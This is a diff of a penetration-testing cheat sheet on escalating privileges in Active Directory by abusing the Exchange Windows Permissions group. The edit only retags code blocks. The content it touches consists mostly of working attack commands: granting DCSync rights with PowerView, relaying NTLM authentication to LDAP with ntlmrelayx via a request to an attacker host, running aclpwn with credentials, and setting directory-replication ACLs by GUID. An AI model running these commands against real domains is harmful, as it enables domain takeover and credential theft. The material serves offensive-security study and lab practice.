@@ -4,26 +4,26 @@ Privilege escalation with ACLs in AD by example of the `Exchange Windows Permiss
 
 Add user to the `Exchange Windows Permissions` group:
 
-```
+```powershell
 PS > Add-ADGroupMember -Identity "Exchange Windows Permissions" -Members snovvcrash
 ```
 
 Add DCSync rights with PowerView2:
 
-```
+```powershell
 PowerView2 > Add-ObjectAcl -TargetDistinguishedName "DC=megacorp,DC=local" -PrincipalName snovvcrash -Rights DCSync -Verbose
 ```
 
 Add DCSync rights with PowerView3:
 
-```
+```powershell
 PS > $cred = New-Object System.Management.Automation.PSCredential("snovvcrash", $(ConvertTo-SecureString "Passw0rd!" -AsPlainText -Force))
 PowerView3 > Add-DomainObjectAcl -TargetIdentity "DC=megacorp,DC=local" -PrincipalIdentity snovvcrash -Credential $cred -Rights DCSync -Verbose
 ```
 
 Add DCSync rights with [ntlmrelayx.py](https://github.com/SecureAuthCorp/impacket/blob/50c76958706577a5005bec2ee1fda9e9fa669a65/impacket/examples/ntlmrelayx/attacks/ldapattack.py#L293):
 
-```
+```powershell
 PS > IWR http://10.10.13.37 -UseDefaultCredentials
 $ sudo ntlmrelayx.py -t ldap://DC01.megacorp.local --escalate-user snovvcrash
 ```
@@ -34,7 +34,7 @@ Add DCSync rights with aclpwn.py:
 * ​[https://www.slideshare.net/DirkjanMollema/aclpwn-active-directory-acl-exploitation-with-bloodhound](https://www.slideshare.net/DirkjanMollema/aclpwn-active-directory-acl-exploitation-with-bloodhound)​
 * ​[https://www.puckiestyle.nl/aclpwn-py/](https://www.puckiestyle.nl/aclpwn-py/)​
 
-```
+```powershell
 $ aclpwn -f snovvcrash -ft user -t megacorp.local -tt domain -d megacorp.local -du neo4j -dp neo4j --server 127.0.0.1 -u snovvcrash -p 'Passw0rd!' -sp 'Passw0rd!'
 ```
 
@@ -46,7 +46,7 @@ Add DCSync rights with ActiveDirectory module:
 * Create a new ACL and within it set "Replicating Directory Changes" (GUID `1131f6ad-9c07-11d1-f79f-00c04fc2dcd2`) and "Replicating Directory Changes All" (GUID `1131f6aa-9c07-11d1-f79f-00c04fc2dcd2`) rights for the SID from (2).
 * Apply changes.
 
-```
+```powershell
 PS > Import-Module ActiveDirectory
 PS > $acl = Get-Acl "AD:DC=megacorp,DC=local"
 PS > $user = Get-ADUser snovvcrash
